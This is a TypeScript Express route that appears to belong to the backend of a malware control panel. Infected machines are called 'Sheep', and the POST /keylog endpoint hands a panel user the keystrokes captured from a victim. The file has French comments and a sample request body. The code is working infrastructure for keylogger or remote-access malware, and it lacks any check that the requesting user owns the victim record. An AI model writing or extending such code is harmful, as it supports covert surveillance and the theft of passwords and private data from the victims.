import { Request, Response } from 'express';
import Sheep from '../../../../mongo/models/sheep';
import User from '../../../../mongo/models/user';

export default {
    handle: "/keylog",
    method: "POST",
    description: "Keylog route",
    route: async (req: Request, res: Response) => {
        const { userId, sheepId }: { userId: string; sheepId: string } = req.body;

        try {
            // Vérifiez si l'utilisateur existe
            const user = await User.findById(userId);
            if (!user) {
                res.status(404).json({ success: false, error: "User not found" });
                return;
            }

            // Vérifiez si le Sheep existe
            const sheep = await Sheep.findById(sheepId);
            if (!sheep) {
                res.status(404).json({ success: false, error: "Sheep not found" });
                return;
            }

            // Renvoyez les données de keylog du Sheep
            res.status(200).json({ success: true, keylog: sheep.keylog });
        } catch (error) {
            res.status(500).json({ success: false, error: "An error occurred while retrieving the keylog" });
        }
    }
};

/*
Exemple de requête:
{
    "userId": "60b8d6c8f8d2b5416c0a4b3c",
    "sheepId": "60b8d6c8f8d2b5416c0a4b3d"
}
*/
